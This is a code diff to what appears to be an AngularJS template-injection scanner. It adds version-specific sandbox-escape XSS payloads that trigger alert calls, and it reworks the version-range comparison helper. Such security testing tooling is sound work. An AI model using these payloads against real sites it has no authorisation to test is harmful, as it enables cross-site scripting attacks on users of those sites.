@@ -62,18 +62,27 @@ class Payloads:
         {
             "min": "1.2.19",
             "max": "1.2.23",
-            "value": """{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","alert(1)"].sort(c)}}"""
+            "value": """{{c=toString.constructor;p=c.prototype;p.toString=p.call;['alert(1)','a'].sort(c)}}"""
+        },
+        {
+            "min": "1.2.19",
+            "max": "1.2.26",
+            "value": """{{(!call?$$watchers[0].get(toString.constructor.prototype):(a=apply)&&(apply=constructor)&&(valueOf=call)&&(''+''.toString('F =Function.prototype;'+'F.apply = F.a;'+'delete F.a;'+'delete F.valueOf;'+'alert(42);')));}}"""
         },
         {
             "min": "1.2.24",
             "max": "1.2.32",
             "value": """{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}"""
         },
-
         {
             "min": "1.3.0",
             "max": "1.3.0",
             "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"""
+        },
+        {
+            "min": "1.3.0",
+            "max": "1.5.8",
+            "value": """{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}"""
         },
         {
             "min": "1.3.1",
@@ -143,26 +152,6 @@ class Payloads:
         return payloads
 
     @staticmethod
-    def version_is_in_range(version, minimum, maximum):
-        """Check if the given version is within the given range.
-
-        Args:
-            version (str): The AngularJS version to check.
-            minimum (str): The minimum version.
-            maximum (str): The maximum version.
-
-        Returns:
-            bool: True if in range, False otherwise
-
-        """
-
-        version = int(version.replace(".", "").ljust(10, "0"))
-        minimum = int(minimum.replace(".", "").ljust(10, "0"))
-        maximum = int(maximum.replace(".", "").ljust(10, "0"))
-
-        return version >= minimum and version <= maximum
-
-    @staticmethod
     def get_verify_payload(payload):
         """Replace `alert` with `open` so PhantomJS checks can be done.
 
@@ -180,3 +169,30 @@ class Payloads:
         """
 
         return payload.replace('alert', 'open')
+
+    @staticmethod
+    def version_is_in_range(version, minimum, maximum):
+        """Check if the given version is within the given range.
+
+        Args:
+            version (str): The AngularJS version to check.
+            minimum (str): The minimum version.
+            maximum (str): The maximum version.
+
+        Returns:
+            bool: True if in range, False otherwise
+
+        """
+
+        req_major, req_minor, req_patch = version.split(".")
+        min_major, min_minor, min_patch = minimum.split(".")
+        max_major, max_minor, max_patch = maximum.split(".")
+
+        required = int(req_major.zfill(2) + req_minor.zfill(2) + req_patch.zfill(2))
+        minimum = int(min_major.zfill(2) + min_minor.zfill(2) + min_patch.zfill(2))
+        maximum = int(max_major.zfill(2) + max_minor.zfill(2) + max_patch.zfill(2))
+
+        if required >= minimum and required <= maximum:
+            return True
+
+        return False
